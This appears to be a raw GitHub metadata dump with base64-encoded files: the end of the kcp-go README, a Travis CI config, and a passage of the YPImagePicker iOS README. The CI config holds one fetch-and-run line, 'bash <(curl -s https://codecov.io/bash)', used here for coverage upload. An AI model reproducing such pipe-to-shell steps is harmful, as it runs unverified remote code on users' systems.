Z2VzIG9uIGxhcmdlciBzY2FsZSBuZXR3b3JrIG1heSBtaXRpZ2F0ZSB0aGlz
IHByb2JsZW0uICBiKSBbcmVwbGF5IGF0dGFja10oaHR0cHM6Ly9lbi53aWtp
cGVkaWEub3JnL3dpa2kvUmVwbGF5X2F0dGFjayksIHNpbmNlIHRoZSBhc3lt
bWV0cmljYWwgZW5jcnlwdGlvbiBoYXMgbm90IGJlZW4gaW50cm9kdWNlZCBp
bnRvIGtjcC1nbyBmb3Igc29tZSByZWFzb24sIGNhcHR1cmluZyB0aGUgcGFj
a2V0cyBhbmQgcmVwbGF5IHRoZW0gb24gYSBkaWZmZXJlbnQgbWFjaGluZSBp
cyBwb3NzaWJsZSwgKG5vdGljZTogaGlqYWNraW5nIHRoZSBzZXNzaW9uIGFu
ZCBkZWNyeXB0aW5nIHRoZSBjb250ZW50cyBpcyBzdGlsbCAqaW1wb3NzaWJs
ZSopLCBzbyB1cHBlciBsYXllcnMgc2hvdWxkIGNvbnRhaW4gYSBhc3ltbWV0
cmljYWwgZW5jcnlwdGlvbiBzeXN0ZW0gdG8gZ3VhcmFudGVlIHRoZSBhdXRo
ZW50aWNpdHkgb2YgZWFjaCBtZXNzYWdlKHRvIHByb2Nlc3MgbWVzc2FnZSBl
eGFjdGx5IG9uY2UpLCBzdWNoIGFzIEhUVFBTL09wZW5TU0wvTGlicmVTU0ws
IG9ubHkgYnkgc2lnbmluZyB0aGUgcmVxdWVzdHMgd2l0aCBwcml2YXRlIGtl
eXMgY2FuIGVsaW1pbmF0ZSB0aGlzIHR5cGUgb2YgYXR0YWNrLiAKCiMjIENv
bm5lY3Rpb24gVGVybWluYXRpb24KCkNvbnRyb2wgbWVzc2FnZXMgbGlrZSAq
KlNZTi9GSU4vUlNUKiogaW4gVENQICoqYXJlIG5vdCBkZWZpbmVkKiogaW4g
S0NQLCB5b3UgbmVlZCBzb21lICoqa2VlcGFsaXZlL2hlYXJ0YmVhdCBtZWNo
YW5pc20qKiBpbiB0aGUgYXBwbGljYXRpb24tbGV2ZWwuIEEgcmVhbCB3b3Js
ZCBleGFtcGxlIGlzIHRvIHVzZSBzb21lICoqbXVsdGlwbGV4aW5nKiogcHJv
dG9jb2wgb3ZlciBzZXNzaW9uLCBzdWNoIGFzIFtzbXV4XShodHRwczovL2dp
dGh1Yi5jb20veHRhY2kvc211eCkod2l0aCBlbWJlZGRlZCBrZWVwYWxpdmUg
bWVjaGFuaXNtKSwgc2VlIFtrY3B0dW5dKGh0dHBzOi8vZ2l0aHViLmNvbS94
dGFjaS9rY3B0dW4pIGZvciBleGFtcGxlLgoKIyMgRkFRCgpROiBJJ20gaGFu
ZGxpbmcgPjVLIGNvbm5lY3Rpb25zIG9uIG15IHNlcnZlciwgdGhlIENQVSB1
dGlsaXphdGlvbiBpcyBzbyBoaWdoLgoKQTogQSBzdGFuZGFsb25lIGBhZ2Vu
dGAgb3IgYGdhdGVgIHNlcnZlciBmb3IgcnVubmluZyBrY3AtZ28gaXMgc3Vn
Z2VzdGVkLCBub3Qgb25seSBmb3IgQ1BVIHV0aWxpemF0aW9uLCBidXQgYWxz
byBpbXBvcnRhbnQgdG8gdGhlICoqcHJlY2lzaW9uKiogb2YgUlRUIG1lYXN1
cmVtZW50cyh0aW1pbmcpIHdoaWNoIGluZGlyZWN0bHkgYWZmZWN0cyByZXRy
YW5zbWlzc2lvbi4gQnkgaW5jcmVhc2luZyB1cGRhdGUgYGludGVydmFsYCB3
aXRoIGBTZXROb0RlbGF5YCBsaWtlIGBjb25uLlNldE5vRGVsYXkoMSwgNDAs
IDEsIDEpYCB3aWxsIGRyYW1hdGljYWxseSByZWR1Y2Ugc3lzdGVtIGxvYWQs
IGJ1dCBsb3dlciB0aGUgcGVyZm9ybWFuY2UuCgpROiBXaGVuIHNob3VsZCBJ
IGVuYWJsZSBGRUM/CgpBOiBGb3J3YXJkIGVycm9yIGNvcnJlY3Rpb24gaXMg
Y3JpdGljYWwgdG8gbG9uZy1kaXN0YW5jZSB0cmFuc21pc3Npb24sIGJlY2F1
c2UgYSBwYWNrZXQgbG9zcyB3aWxsIGxlYWQgdG8gYSBodWdlIHBlbmFsdHkg
aW4gdGltZS4gQW5kIGZvciB0aGUgY29tcGxpY2F0ZWQgcGFja2V0IHJvdXRp
bmcgbmV0d29yayBpbiBtb2Rlcm4gd29ybGQsIHJvdW5kLXRyaXAgdGltZSBi
YXNlZCBsb3NzIGNoZWNrIHdpbGwgbm90IGFsd2F5cyBiZSBlZmZpY2llbnQs
IHRoZSBiaWcgZGV2aWF0aW9uIG9mIFJUVCBzYW1wbGVzIGluIHRoZSBsb25n
IHdheSB1c3VhbGx5IGxlYWRzIHRvIGEgbGFyZ2VyIFJUTyB2YWx1ZSBpbiB0
eXBpY2FsIHJ0dCBlc3RpbWF0b3IsIHdoaWNoIGluIG90aGVyIHdvcmRzLCBz
bG93cyBkb3duIHRoZSB0cmFuc21pc3Npb24uCiAgClE6IFNob3VsZCBJIGVu
YWJsZSBlbmNyeXB0aW9uPwoKQTogWWVzLCBmb3IgdGhlIHNhZmV0eSBvZiBw
cm90b2NvbCwgZXZlbiBpZiB0aGUgdXBwZXIgbGF5ZXIgaGFzIGVuY3J5cHRl
ZC4KCiMjIFdobyBpcyB1c2luZyB0aGlzPwoKMS4gaHR0cHM6Ly9naXRodWIu
Y29tL3h0YWNpL2tjcHR1biAtLSBBIFNlY3VyZSBUdW5uZWwgQmFzZWQgT24g
S0NQIG92ZXIgVURQLgoyLiBodHRwczovL2dpdGh1Yi5jb20vZ2V0bGFudGVy
bi9sYW50ZXJuIC0tIExhbnRlcm4gZGVsaXZlcnMgZmFzdCBhY2Nlc3MgdG8g
dGhlIG9wZW4gSW50ZXJuZXQuIAozLiBodHRwczovL2dpdGh1Yi5jb20vc21h
bGxuZXN0L3JwY3ggLS0gQSBSUEMgc2VydmljZSBmcmFtZXdvcmsgYmFzZWQg
b24gbmV0L3JwYyBsaWtlIGFsaWJhYmEgRHViYm8gYW5kIHdlaWJvIE1vdGFu
Lgo0LiBodHRwczovL2dpdGh1Yi5jb20vZ29uZXQyL2FnZW50IC0tIEEgZ2F0
ZXdheSBmb3IgZ2FtZXMgd2l0aCBzdHJlYW0gbXVsdGlwbGV4aW5nLgo1LiBo
dHRwczovL2dpdGh1Yi5jb20vc3luY3RoaW5nL3N5bmN0aGluZyAtLSBPcGVu
IFNvdXJjZSBDb250aW51b3VzIEZpbGUgU3luY2hyb25pemF0aW9uLgoKIyMg
TGlua3MKCjEuIGh0dHBzOi8vZ2l0aHViLmNvbS94dGFjaS9zbXV4LyAtLSBB
IFN0cmVhbSBNdWx0aXBsZXhpbmcgTGlicmFyeSBmb3IgZ29sYW5nIHdpdGgg
bGVhc3QgbWVtb3J5CjEuIGh0dHBzOi8vZ2l0aHViLmNvbS94dGFjaS9saWJr
Y3AgLS0gRkVDIGVuaGFuY2VkIEtDUCBzZXNzaW9uIGxpYnJhcnkgZm9yIGlP
Uy9BbmRyb2lkIGluIEMrKwoxLiBodHRwczovL2dpdGh1Yi5jb20vc2t5d2lu
ZDMwMDAva2NwIC0tIEEgRmFzdCBhbmQgUmVsaWFibGUgQVJRIFByb3RvY29s
CjEuIGh0dHBzOi8vZ2l0aHViLmNvbS9rbGF1c3Bvc3QvcmVlZHNvbG9tb24g
LS0gUmVlZC1Tb2xvbW9uIEVyYXN1cmUgQ29kaW5nIGluIEdvCgojIyBDb25z
dWx0aW5nIAoKV2VDaGF0KOS7mOi0ueaKgOacr+WSqOivoikKCjxpbWcgc3Jj
PSJ3ZWNoYXRfZG9uYXRlLmpwZyIgYWx0PSJrY3B0dW4iIGhlaWdodD0iMTIw
cHgiIC8+IAo=
",,"bGFuZ3VhZ2U6IGdvCmdvOgogICAgLSAxLjkueAogICAgLSAxLjEwLngKICAg
IC0gMS4xMS54CgpiZWZvcmVfaW5zdGFsbDoKICAgIC0gZ28gZ2V0IC10IC12
IC4vLi4uCgppbnN0YWxsOgogICAgLSBnbyBnZXQgZ2l0aHViLmNvbS94dGFj
aS9rY3AtZ28KCnNjcmlwdDoKICAgIC0gZ28gdGVzdCAtY292ZXJwcm9maWxl
PWNvdmVyYWdlLnR4dCAtY292ZXJtb2RlPWF0b21pYyAtYmVuY2ggLgoKYWZ0
ZXJfc3VjY2VzczoKICAgIC0gYmFzaCA8KGN1cmwgLXMgaHR0cHM6Ly9jb2Rl
Y292LmlvL2Jhc2gpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'YPImagePicker',97729528,b'\xf0\x9f\x93\xb8 Instagram-like image picker & filters for iOS',b'Swift',136,2377,,2377,False,b'https://api.github.com/repos/Yummypets/YPImagePicker/forks',"PGgxIGFsaWduPSJjZW50ZXIiPiA8YnI+PGltZyBzcmM9IkltYWdlcy9sb2dv
L2xvZ290eXBlX2hvcml6b250YWwucG5nP3Jhdz10cnVlIiBhbHQ9InlwaW1h
Z2VwaWNrZXIiIHdpZHRoPSI1MTIiPiA8YnI+Cgo8aW1nIHNyYz0iaHR0cHM6
Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1bW15cGV0cy9ZUEltYWdl
UGlja2VyL21hc3Rlci9JbWFnZXMvdmlzdWFsLmpwZyIgd2lkdGg9IjQwMHB4
IiA+CgojIyBZUEltYWdlUGlja2VyCgpZUEltYWdlUGlja2VyIGlzIGFuIGlu
c3RhZ3JhbS1saWtlIHBob3RvL3ZpZGVvIHBpY2tlciBmb3IgaU9TIHdyaXR0
ZW4gaW4gcHVyZSBTd2lmdC4gSXQgaXMgZmVhdHVyZS1yaWNoIGFuZCBoaWdo
bHkgY3VzdG9taXphYmxlIHRvIG1hdGNoIHlvdXIgQXBwJ3MgcmVxdWlyZW1l
bnRzLgoKWyFbTGFuZ3VhZ2U6IFN3aWZ0IDVdKGh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vYmFkZ2UvbGFuZ3VhZ2Utc3dpZnQlMjA1LWY0ODA0MS5zdmc/c3R5
bGU9ZmxhdCldKGh0dHBzOi8vZGV2ZWxvcGVyLmFwcGxlLmNvbS9zd2lmdCkK
WyFbVmVyc2lvbl0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9jb2NvYXBvZHMv
di9ZUEltYWdlUGlja2VyLnN2Zz9zdHlsZT1mbGF0KV0oaHR0cDovL2NvY29h
cG9kcy5vcmcvcG9kcy9ZUEltYWdlUGlja2VyKQpbIVtQbGF0Zm9ybV0oaHR0
cHM6Ly9pbWcuc2hpZWxkcy5pby9jb2NvYXBvZHMvcC9ZUEltYWdlUGlja2Vy
LnN2Zz9zdHlsZT1mbGF0KV0oaHR0cDovL2NvY29hcG9kcy5vcmcvcG9kcy9Z
UEltYWdlUGlja2VyKQpbIVtDYXJ0aGFnZSBjb21wYXRpYmxlXShodHRwczov
L2ltZy5zaGllbGRzLmlvL2JhZGdlL0NhcnRoYWdlLWNvbXBhdGlibGUtNEJD
NTFELnN2Zz9zdHlsZT1mbGF0KV0oaHR0cHM6Ly9naXRodWIuY29tL0NhcnRo
YWdlL0NhcnRoYWdlKQpbIVtjb2RlYmVhdCBiYWRnZV0oaHR0cHM6Ly9jb2Rl
YmVhdC5jby9iYWRnZXMvOTcxMGE4OWQtYjFlMi00ZTU1LWE0YTItM2FlMWY5
OGY0YzUzKV0oaHR0cHM6Ly9jb2RlYmVhdC5jby9wcm9qZWN0cy9naXRodWIt
Y29tLXl1bW15cGV0cy15cGltYWdlcGlja2VyLW1hc3RlcikKWyFbTGljZW5z
ZTogTUlUXShodHRwOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvbGljZW5zZS1N
SVQtbGlnaHRncmV5LnN2Zz9zdHlsZT1mbGF0KV0oaHR0cHM6Ly9naXRodWIu
Y29tL1l1bW15cGV0cy9ZUEltYWdlUGlja2VyL2Jsb2IvbWFzdGVyL0xJQ0VO
U0UpClshW0dpdEh1YiB0YWddKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vZ2l0
aHViL3JlbGVhc2UvWXVtbXlwZXRzL1lQSW1hZ2VQaWNrZXIuc3ZnKV0oKQoK
CltJbnN0YWxsYXRpb25dKCNpbnN0YWxsYXRpb24pIC0gW0NvbmZpZ3VyYXRp
b25dKCNjb25maWd1cmF0aW9uKSAtIFtVc2FnZV0oI3VzYWdlKSAtIFtMYW5n
dWFnZXNdKCNsYW5ndWFnZXMpIC0gW1VJIEN1c3RvbWl6YXRpb25dKCN1aS1j
dXN0b21pemF0aW9uKQoKCkdpdmUgaXQgYSBxdWljayB0cnkgOgpgcG9kIHJl
cG8gdXBkYXRlYCB0aGVuIGBwb2QgdHJ5IFlQSW1hZ2VQaWNrZXJgCgo8aW1n
IHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1l1bW15
cGV0cy9ZUEltYWdlUGlja2VyL21hc3Rlci9JbWFnZXMvbGlicmFyeS5QTkci
IHdpZHRoPSIyMDBweCIgPiA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVi
dXNlcmNvbnRlbnQuY29tL1l1bW15cGV0cy9ZUEltYWdlUGlja2VyL21hc3Rl
ci9JbWFnZXMvcGhvdG8uUE5HIiB3aWR0aD0iMjAwcHgiID4gPGltZyBzcmM9
Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ZdW1teXBldHMv
WVBJbWFnZVBpY2tlci9tYXN0ZXIvSW1hZ2VzL3ZpZGVvLlBORyIgd2lkdGg9
IjIwMHB4IiA+IDxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29u
dGVudC5jb20vWXVtbXlwZXRzL1lQSW1hZ2VQaWNrZXIvbWFzdGVyL0ltYWdl
cy9maWx0ZXJzLlBORyIgd2lkdGg9IjIwMHB4IiA+CgpUaG9zZSBmZWF0dXJl
cyBhcmUgYXZhaWxhYmxlIGp1c3Qgd2l0aCBhIGZldyBsaW5lcyBvZiBjb2Rl
IQoKIyMgTm90YWJsZSBGZWF0dXJlcwoK8J+MhSBMaWJyYXJ5ICAK8J+TtyBQ
aG90byAgCvCfjqUgVmlkZW8gIArinILvuI8gQ3JvcCAgCuKaoe+4jyBGbGFz
aCAgCvCflrwgRmlsdGVycyAgCvCfk4EgQWxidW1zICAK8J+UoiBNdWx0aXBs
ZSBTZWxlY3Rpb24gIArwn5OPIFZpZGVvIFRyaW1taW5nICYgQ292ZXIgc2Vs
ZWN0aW9uICAK8J+TkCBPdXRwdXQgaW1hZ2Ugc2l6ZSAgCkFuZCBtYW55IG1v
cmUuLi4KCiMjIEluc3RhbGxhdGlvbgoKRHJvcCBpbiB0aGUgQ2xhc3NlcyBm
b2xkZXIgdG8geW91ciBYY29kZSBwcm9qZWN0LiAgCllvdSBjYW4gYWxzbyB1
c2UgQ29jb2FQb2RzIG9yIENhcnRoYWdlLgoKIyMjIyBVc2luZyBbQ29jb2FQ
b2RzXShodHRwOi8vY29jb2Fwb2RzLm9yZy8pCgpGaXJzdCBiZSBzdXJlIHRv
IHJ1biBgcG9kIHJlcG8gdXBkYXRlYCB0byBnZXQgdGhlIGxhdGVzdCB2ZXJz
aW9uIGF2YWlsYWJsZS4KCkFkZCBgcG9kICdZUEltYWdlUGlja2VyJ2AgdG8g
eW91ciBgUG9kZmlsZWAgYW5kIHJ1biBgcG9kIGluc3RhbGxgLiBBbHNvIGFk
ZCBgdXNlX2ZyYW1ld29ya3MhYCB0byB0aGUgYFBvZGZpbGVgLgoKYGBgCnRh
cmdldCAnTXlBcHAnCnBvZCAnWVBJbWFnZVBpY2tlcicKdXNlX2ZyYW1ld29y
a3MhCmBgYAoKIyMjIyBVc2luZyBbQ2FydGhhZ2VdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9DYXJ0aGFnZS9DYXJ0aGFnZSkKCkFkZCBgZ2l0aHViICJZdW1teXBl
dHMvWVBJbWFnZVBpY2tlciJgIHRvIHlvdXIgYENhcnRmaWxlYCBhbmQgcnVu
IGBjYXJ0aGFnZSB1cGRhdGVgLiBJZiB1bmZhbWlsaWFyIHdpdGggQ2FydGhh
Z2UgdGhlbiBjaGVja291dCB0aGVpciBbR2V0dGluZyBTdGFydGVkIHNlY3Rp
b25dKGh0dHBzOi8vZ2l0aHViLmNvbS9DYXJ0aGFnZS9DYXJ0aGFnZSNnZXR0
aW5nLXN0YXJ0ZWQpLgoKYGBgCmdpdGh1YiAiWXVtbXlwZXRzL1lQSW1hZ2VQ
aWNrZXIiCmBgYAoKIyMgUGxpc3QgZW50cmllcwoKSW4gb3JkZXIgZm9yIHlv
dXIgYXBwIHRvIGFjY2VzcyBjYW1lcmEgYW5kIHBob3RvIGxpYnJhcmllcywK
eW91J2xsIG5lZWQgdG8gYWQgdGhlc2UgYHBsaXN0IGVudHJpZXNgIDoKCi0g
UHJpdmFjeSAtIENhbWVyYSBVc2FnZSBEZXNjcmlwdGlvbiAocGhvdG8vdmlk
ZW9zKQotIFByaXZhY3kgLSBQaG90byBMaWJyYXJ5IFVzYWdlIERlc2NyaXB0
aW9uIChsaWJyYXJ5KQotIFByaXZhY3kgLSBNaWNyb3Bob25lIFVzYWdlIERl
c2NyaXB0aW9uICh2aWRlb3MpCgpgYGB4bWwKPGtleT5OU0NhbWVyYVVzYWdl
RGVzY3JpcHRpb248L2tleT4KPHN0cmluZz55b3VyV29yZGluZzwvc3RyaW5n
Pgo8a2V5Pk5TUGhvdG9MaWJyYXJ5VXNhZ2VEZXNjcmlwdGlvbjwva2V5Pgo8
c3RyaW5nPnlvdXJXb3JkaW5nPC9zdHJpbmc+CjxrZXk+TlNNaWNyb3Bob25l
VXNhZ2VEZXNjcmlwdGlvbjwva2V5Pgo8c3RyaW5nPnlvdXJXb3JkaW5nPC9z
dHJpbmc+CmBgYAoKIyMgQ29uZmlndXJhdGlvbgoKQWxsIHRoZSBjb25maWd1
cmF0aW9uIGVuZHBvaW50cyBhcmUgaW4gdGhlIFtZUEltYWdlUGlja2VyQ29u
ZmlndXJhdGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL1l1bW15cGV0cy9ZUElt
YWdlUGlja2VyL2Jsb2IvbWFzdGVyL1NvdXJjZS9Db25maWd1cmF0aW9uL1lQ
SW1hZ2VQaWNrZXJDb25maWd1cmF0aW9uLnN3aWZ0KSBzdHJ1Y3QuCkJlbG93
IGFyZSB0aGUgZGVmYXVsdCB2YWx1ZSBmb3IgcmVmZXJlbmNlLCBmZWVsIGZy
ZWUgdG8gcGxheSBhcm91bmQgOikKCmBgYHN3aWZ0CnZhciBjb25maWcgPSBZ
UEltYWdlUGlja2VyQ29uZmlndXJhdGlvbigpCi8vIFtFZGl0IGNvbmZpZ3Vy
YXRpb24gaGVyZSAuLi5dCi8vIEJ1aWxkIGEgcGlja2VyIHdpdGggeW91ciBj
b25maWd1cmF0aW9uCmxldCBwaWNrZXIgPSBZUEltYWdlUGlja2VyKGNvbmZp
Z3VyYXRpb246IGNvbmZpZykKYGBgCgojIyMgR2VuZXJhbApgYGBTd2lmdApj
b25maWcuaXNTY3JvbGxUb0NoYW5nZU1vZGVzRW5hYmxlZCA9IHRydWUKY29u
ZmlnLm9ubHlTcXVhcmVJbWFnZXNGcm9tQ2FtZXJhID0gdHJ1ZQpjb25maWcu
dXNlc0Zyb250Q2FtZXJhID0gZmFsc2UKY29uZmlnLnNob3dzUGhvdG9GaWx0
ZXJzID0gdHJ1ZQpjb25maWcuc2hvdWxkU2F2ZU5ld1BpY3R1cmVzVG9BbGJ1
bSA9IHRydWUKY29uZmlnLmFsYnVtTmFtZSA9ICJEZWZhdWx0WVBJbWFnZVBp
Y2tlckFsYnVtTmFtZSIKY29uZmlnLnN0YXJ0T25TY3JlZW4gPSBZUFBpY2tl
clNjcmVlbi5waG90bwpjb25maWcuc2NyZWVucyA9IFsubGlicmFyeSwgLnBo
b3RvXQpjb25maWcuc2hvd3NDcm9wID0gLm5vbmUKY29uZmlnLnRhcmdldElt
YWdlU2l6ZSA9IFlQSW1hZ2VTaXplLm9yaWdpbmFsCmNvbmZpZy5vdmVybGF5
VmlldyA9IFVJVmlldygpCmNvbmZpZy5oaWRlc1N0YXR1c0JhciA9IHRydWUK
Y29uZmlnLmhpZGVzQm90dG9tQmFyID0gZmFsc2UKY29uZmlnLnByZWZlcnJl
ZFN0YXR1c0JhclN0eWxlID0gVUlTdGF0dXNCYXJTdHlsZS5kZWZhdWx0CmNv
bmZpZy5ib3R0b21NZW51SXRlbVNlbGVjdGVkQ29sb3VyID0gVUlDb2xvcihy
OiAzOCwgZzogMzgsIGI6IDM4KQpjb25maWcuYm90dG9tTWVudUl0ZW1VblNl
bGVjdGVkQ29sb3VyID0gVUlDb2xvcihyOiAxNTMsIGc6IDE1MywgYjogMTUz
KQpjb25maWcuZmlsdGVycyA9IFtEZWZhdWx0WVBGaWx0ZXJzLi4uXQpgYGAK
CiMjIyBMaWJyYXJ5CmBgYHN3aWZ0CmNvbmZpZy5saWJyYXJ5Lm9wdGlvbnMg
PSBuaWwKY29uZmlnLmxpYnJhcnkub25seVNxdWFyZSA9IGZhbHNlCmNvbmZp
Zy5saWJyYXJ5Lm1pbldpZHRoRm9ySXRlbSA9IG5pbApjb25maWcubGlicmFy
eS5tZWRpYVR5cGUgPSBZUGxpYnJhcnlNZWRpYVR5cGUucGhvdG8KY29uZmln
LmxpYnJhcnkubWF4TnVtYmVyT2ZJdGVtcyA9IDEKY29uZmlnLmxpYnJhcnku
bWluTnVtYmVyT2ZJdGVtcyA9IDEKY29uZmlnLmxpYnJhcnkubnVtYmVyT2ZJ
dGVtc0luUm93ID0gNApjb25maWcubGlicmFyeS5zcGFjaW5nQmV0d2Vlbkl0
ZW1zID0gMS4wCmNvbmZpZy5saWJyYXJ5LnNraXBTZWxlY3Rpb25zR2FsbGVy
eSA9IGZhbHNlCmBgYAoKIyMjIFZpZGVvCmBgYHN3aWZ0CmNvbmZpZy52aWRl
by5jb21wcmVzc2lvbiA9IEFWQXNzZXRFeHBvcnRQcmVzZXRIaWdoZXN0UXVh
bGl0eQpjb25maWcudmlkZW8uZmlsZVR5cGUgPSAubW92CmNvbmZpZy52aWRl
by5yZWNvcmRpbmdUaW1lTGltaXQgPSA2MC4wCmNvbmZpZy52aWRlby5saWJy
YXJ5VGltZUxpbWl0ID0gNjAuMApjb25maWcudmlkZW8ubWluaW11bVRpbWVM
aW1pdCA9IDMuMApjb25maWcudmlkZW8udHJpbW1lck1heER1cmF0aW9uID0g
NjAuMApjb25maWcudmlkZW8udHJpbW1lck1pbkR1cmF0aW9uID0gMy4wCmBg
YAoKIyMgRGVmYXVsdCBDb25maWd1cmF0aW9uCgpgYGBzd2lmdAovLyBTZXQg
dGhlIGRlZmF1bHQgY29uZmlndXJhdGlvbiBmb3IgYWxsIHBpY2tlcnMKWVBJ
bWFnZVBpY2tlckNvbmZpZ3VyYXRpb24uc2hhcmVkID0gY29uZmlnCgovLyBB
bmQgdGhlbiB1c2UgdGhlIGRlZmF1bHQgY29uZmlndXJhdGlvbiBsaWtlIHNv
OgpsZXQgcGlja2VyID0gWVBJbWFnZVBpY2tlcigpCmBgYAoKIyMgVXNhZ2UK
CkZpcnN0IHRoaW5ncyBmaXJzdCBgaW1wb3J0IFlQSW1hZ2VQaWNrZXJgLiAg
CgpUaGUgcGlja2VyIG9ubHkgaGFzIG9uZSBjYWxsYmFjayBgZGlkRmluaXNo
UGlja2luZ2AgZW5hYmxpbmcgeW91IHRvIGhhbmRsZSBhbGwgdGhlIGNhc2Vz
LiBMZXQncyBzZWUgc29tZSB0eXBpY2FsIHVzZSBjYXNlcyDwn6STCgojIyMg
U2luZ2xlIFBob3RvCmBgYHN3aWZ0CmxldCBwaWNrZXIgPSBZUEltYWdlUGlj
a2VyKCkKcGlja2VyLmRpZEZpbmlzaFBpY2tpbmcgeyBbdW5vd25lZCBwaWNr
ZXJdIGl0ZW1zLCBfIGluCiAgICBpZiBsZXQgcGhvdG8gPSBpdGVtcy5zaW5n
bGVQaG90byB7CiAgICAgICAgcHJpbnQocGhvdG8uZnJvbUNhbWVyYSkgLy8g
SW1hZ2Ugc291cmNlIChjYW1lcmEgb3IgbGlicmFyeSkKICAgICAgICBwcmlu
dChwaG90by5pbWFnZSkgLy8gRmluYWwgaW1hZ2Ugc2VsZWN0ZWQgYnkgdGhl
IHVzZXIKICAgICAgICBwcmludChwaG90by5vcmlnaW5hbEltYWdlKSAvLyBv
cmlnaW5hbCBpbWFnZSBzZWxlY3RlZCBieSB0aGUgdXNlciwgdW5maWx0ZXJl
ZAogICAgICAgIHByaW50KHBob3RvLm1vZGlmaWVkSW1hZ2UpIC8vIFRyYW5z
Zm9ybWVkIGltYWdlLCBjYW4gYmUgbmlsCiAgICAgICAgcHJpbnQocGhvdG8u
ZXhpZk1ldGEpIC8vIFByaW50IGV4aWYgbWV0YSBkYXRhIG9mIG9yaWdpbmFs
IGltYWdlLgogICAgfQogICAgcGlja2VyLmRpc21pc3MoYW5pbWF0ZWQ6IHRy
dWUsIGNvbXBsZXRpb246IG5pbCkKfQpwcmVzZW50KHBpY2tlciwgYW5pbWF0
ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKYGBgCgojIyMgU2luZ2xlIHZp
ZGVvCmBgYHN3aWZ0Ci8vIEhlcmUgd2UgY29uZmlndXJlIHRoZSBwaWNrZXIg
dG8gb25seSBzaG93IHZpZGVvcywgbm8gcGhvdG9zLgp2YXIgY29uZmlnID0g
WVBJbWFnZVBpY2tlckNvbmZpZ3VyYXRpb24oKQpjb25maWcuc2NyZWVucyA9
IFsubGlicmFyeSwgLnZpZGVvXQpjb25maWcubGlicmFyeS5tZWRpYVR5cGUg
PSAudmlkZW8KCmxldCBwaWNrZXIgPSBZUEltYWdlUGlja2VyKGNvbmZpZ3Vy
YXRpb246IGNvbmZpZykKcGlja2VyLmRpZEZpbmlzaFBpY2tpbmcgeyBbdW5v
d25lZCBwaWNrZXJdIGl0ZW1zLCBfIGluCiAgICBpZiBsZXQgdmlkZW8gPSBp
dGVtcy5zaW5nbGVWaWRlbyB7CiAgICAgICAgcHJpbnQodmlkZW8uZnJvbUNh
bWVyYSkKICAgICAgICBwcmludCh2aWRlby50aHVtYm5haWwpCiAgICAgICAg
cHJpbnQodmlkZW8udXJsKQogICAgfQogICAgcGlja2VyLmRpc21pc3MoYW5p
bWF0ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKfQpwcmVzZW50KHBpY2tl
ciwgYW5pbWF0ZWQ6IHRydWUsIGNvbXBsZXRpb246IG5pbCkKYGBgCgpBcyB5
b3UgY2FuIHNlZSBgc2luZ2xlUGhvdG9gIGFuZCBgc2luZ2xlVmlkZW9gIGhl
bHBlcnMgYXJlIGhlcmUgdG8gaGVscCB5b3UgaGFuZGxlIHNpbmdsZSBtZWRp
YSB3aGljaCBhcmUgdmVyeSBjb21tb24sIHdoaWxlIHVzaW5nIHRoZSBzYW1l
IGNhbGxiYWNrIGZvciBhbGwgeW91ciB1c2UtY2FzZXMgXG8vCgojIyMgTXVs
dGlwbGUgc2VsZWN0aW9uClRvIGVuYWJsZSBtdWx0aXBsZSBzZWxlY3Rpb24g
bWFrZSBzdXJlIHRvIHNldCBgbGlicmFyeS5tYXhOdW1iZXJPZkl0ZW1zYCBp
biB0aGUgY29uZmlndXJhdGlvbiBsaWtlIHNvOgpgYGBzd2lmdAp2YXIgY29u
ZmlnID0gWVBJbWFnZVBpY2tlckNvbmZpZ3VyYXRpb24oKQpjb25maWcubGli
cmFyeS5tYXhOdW1iZXJPZkl0ZW1zID0gMwpsZXQgcGlja2VyID0gWVBJbWFn
ZVBpY2tlcihjb25maWd1cmF0aW9uOiBjb25maWcpCmBgYApUaGVuIHlvdSBj
YW4gaGFuZGxlIG11bHRpcGxlIHNlbGVjdGlvbiBpbiB0aGUgc2FtZSBjYWxs
YmFjayB5b3Uga25vdyBhbmQgbG92ZSA6CmBgYHN3aWZ0CnBpY2tlci5kaWRG
aW5pc2hQaWNraW5nIHsgW3Vub3duZWQgcGlja2VyXSBpdGVtcywgY2FuY2Vs
bGVkIGluCiAgICBmb3IgaXRlbSBpbiBpdGVtcyB7CiAgICAgICAgc3dpdGNo
IGl0ZW0gewogICAgICAgIGNhc2UgLnBob3RvKGxldCBwaG90byk6CiAgICAg
ICAgICAgIHByaW50KHBob3RvKQogICAgICAgIGNhc2UgLnZpZGVvKGxldCB2
aWRlbyk6CiAgICAgICAgICAgIHByaW50KHZpZGVvKQogICAgICAgIH0KICAg
IH0KICAgIHBpY2tlci5kaXNtaXNzKGFuaW1hdGVkOiB0cnVlLCBjb21wbGV0
aW9uOiBuaWwpCn0KYGBgCgojIyMgSGFuZGxlIENhbmNlbCBldmVudCAoaWYg
bmVlZGVkKQpgYGBzd2lmdApwaWNrZXIuZGlkRmluaXNoUGlja2luZyB7IFt1
bm93bmVkIHBpY2tlcl0gaXRlbXMsIGNhbmNlbGxlZCBpbgogICAgaWYgY2Fu
Y2VsbGVkIHsKICAgICAgICBwcmludCgiUGlja2VyIHdhcyBjYW5jZWxlZCIp
CiAgICB9CiAgICBwaWNrZXIuZGlzbWlzcyhhbmltYXRlZDogdHJ1ZSwgY29t
